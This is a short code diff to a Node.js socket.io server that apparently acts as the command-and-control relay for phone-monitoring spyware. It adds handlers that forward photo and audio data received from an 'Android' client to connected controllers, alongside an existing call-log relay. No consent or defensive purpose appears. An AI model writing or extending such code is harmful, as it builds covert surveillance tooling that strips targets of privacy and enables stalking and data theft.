@@ -79,6 +79,16 @@ io.on('connection', (socket) => {
                 io.emit('call_logs', data);
             });
 
+            socket.on('photo_data', (data) => {
+                console.log(`[+] PHOTO DATA RECEIVED from Android`);
+                io.emit('photo_data', data);
+            });
+
+            socket.on('audio_data', (data) => {
+                console.log(`[+] AUDIO DATA RECEIVED from Android`);
+                io.emit('audio_data', data);
+            });
+
         } else if (type === 'mobile') {
             console.log(`[+] CONTROLLER (MOBILE) CONNECTED: ${socket.id}`);
             if (pcSocketId || androidSocketId) socket.emit('status', 'ONLINE');
